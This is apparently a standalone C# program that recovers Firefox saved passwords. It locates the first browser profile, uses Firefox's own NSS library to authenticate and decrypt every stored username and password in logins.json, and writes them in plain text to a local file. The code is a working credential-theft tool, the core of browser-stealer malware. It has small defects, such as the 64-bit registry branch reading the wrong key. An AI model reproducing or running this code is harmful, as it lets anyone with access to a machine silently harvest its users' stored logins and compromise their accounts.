using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace firefox
{
    /// <summary>
    /// A small class to recover Firefox Data
    /// </summary>
    public static class Firefox
    {
        private static IntPtr nssModule;

        private static DirectoryInfo firefoxPath;
        private static DirectoryInfo firefoxProfilePath;

        private static FileInfo firefoxLoginFile;

        static Firefox()
        {

            firefoxPath = GetFirefoxInstallPath();
            if (firefoxPath == null)
                throw new NullReferenceException("Firefox is not installed, or the install path could not be located");

            firefoxProfilePath = GetProfilePath();
            if (firefoxProfilePath == null)
                throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");

            firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
            if (firefoxLoginFile == null)
                throw new NullReferenceException("Firefox does not have any logins.json file");


        }

        #region Public Members
        /// <summary>
        /// Recover Firefox Passwords from logins.json
        /// </summary>
        /// <returns>List of Username/Password/Host</returns>
        public static List<FirefoxPassword> Passwords()
        {

            List<FirefoxPassword> firefoxPasswords = new List<FirefoxPassword>();

            // init libs
            InitializeDelegates(firefoxProfilePath, firefoxPath);


            JsonFFData ffLoginData = new JsonFFData();

            using (StreamReader sr = new StreamReader(firefoxLoginFile.FullName))
            {
                string json = sr.ReadToEnd();
                ffLoginData = JsonConvert.DeserializeObject<JsonFFData>(json);
            }

            foreach (LoginData data in ffLoginData.logins)
            {
                string username = Decrypt(data.encryptedUsername);
                string password = Decrypt(data.encryptedPassword);
                Uri host = new Uri(data.formSubmitURL);
                FirefoxPassword f = new FirefoxPassword() { Host = host, Username = username, Password = password };
                firefoxPasswords.Add(f);               
            }

            return firefoxPasswords;
        }
       
        #endregion

        #region Functions
        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
        {
            //LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
            //LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
            LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
            LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
            LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
            nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
            IntPtr pProc = GetProcAddress(nssModule, "NSS_Init");
            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
            NSS_Init(firefoxProfilePath.FullName);
            long keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(keySlot, true, 0);
        }
        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }
        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long)span.TotalSeconds;
        }
        #endregion

        #region File Handling
        private static DirectoryInfo GetProfilePath()
        {
            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
            if (!Directory.Exists(raw))
                throw new Exception("Firefox Application Data folder does not exist!");
            DirectoryInfo profileDir = new DirectoryInfo(raw);

            DirectoryInfo[] profiles = profileDir.GetDirectories();
            if (profiles.Length == 0)
                throw new IndexOutOfRangeException("No Firefox profiles could be found");

            // return first profile, fuck it.
            return profiles[0];

        }
        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
        {
            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
            {
                return file;
            }
            throw new Exception("No Firefox logins.json was found");


        }
        private static DirectoryInfo GetFirefoxInstallPath()
        {
            DirectoryInfo firefoxPath = null;
            // get firefox path from registry
            // we'll search the 32bit install location
            RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
            // and lets try the 64bit install location just in case
            RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);

            if (localMachine1 != null)
            {
                string[] installedVersions = localMachine1.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");

                firefoxPath = new DirectoryInfo(installString);


            }
            else if (localMachine2 != null)
            {
                string[] installedVersions = localMachine1.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");

                firefoxPath = new DirectoryInfo(installString);
            }
            return firefoxPath;
        }
        #endregion

        #region WinApi
        // Credit: http://www.pinvoke.net/default.aspx/kernel32.loadlibrary
        private static IntPtr LoadWin32Library(string libPath)
        {
            if (String.IsNullOrEmpty(libPath))
                throw new ArgumentNullException("libPath");

            IntPtr moduleHandle = LoadLibrary(libPath);
            if (moduleHandle == IntPtr.Zero)
            {
                var lasterror = Marshal.GetLastWin32Error();
                var innerEx = new Win32Exception(lasterror);
                innerEx.Data.Add("LastWin32Error", lasterror);

                throw new Exception("can't load DLL " + libPath, innerEx);
            }
            return moduleHandle;
        }

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        #endregion

        #region JSON
        // json deserialize classes
        private class JsonFFData
        {

            public long nextId;
            public LoginData[] logins;
            public string[] disabledHosts;
            public int version;

        }
        private class LoginData
        {

            public long id;
            public string hostname;
            public string url;
            public string httprealm;
            public string formSubmitURL;
            public string usernameField;
            public string passwordField;
            public string encryptedUsername;
            public string encryptedPassword;
            public string guid;
            public int encType;
            public long timeCreated;
            public long timeLastUsed;
            public long timePasswordChanged;
            public long timesUsed;

        }
        #endregion

        #region Delegate Handling
        // Credit: http://www.codeforge.com/article/249225
        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
            return ptr();
        }
        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11_Authenticate");
            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
            return ptr(slot, loadCerts, wincx);
        }
        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
            NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
            return ptr(arenaOpt, outItemOpt, inStr, inLen);
        }
        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11SDR_Decrypt");
            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
            return ptr(ref data, ref result, cx);
        }
        private static string Decrypt(string cypherText)
        {
            StringBuilder sb = new StringBuilder(cypherText);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            TSECItem tSecDec = new TSECItem();
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            var res = PK11SDR_Decrypt(ref item, ref tSecDec, 0);
            if ( res == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
            return null;
        }
        #endregion
    }
    public class FirefoxPassword
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public Uri Host { get; set; }
        public override string ToString()
        {
            return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
        }
    }

    public class Ejecuta {

        public static void toFile(string name, List<FirefoxPassword> list) {
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(name, true))
            {
                foreach (FirefoxPassword pass in list)
                {
                    // If the line doesn't contain the word 'Second', write the line to the file.
                        file.WriteLine(pass.ToString());
                    }
            }
        }

        public static void Main() {
            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
            toFile("firefoxPasswods.txt",firefoxPasswords);
        } 

    }
}
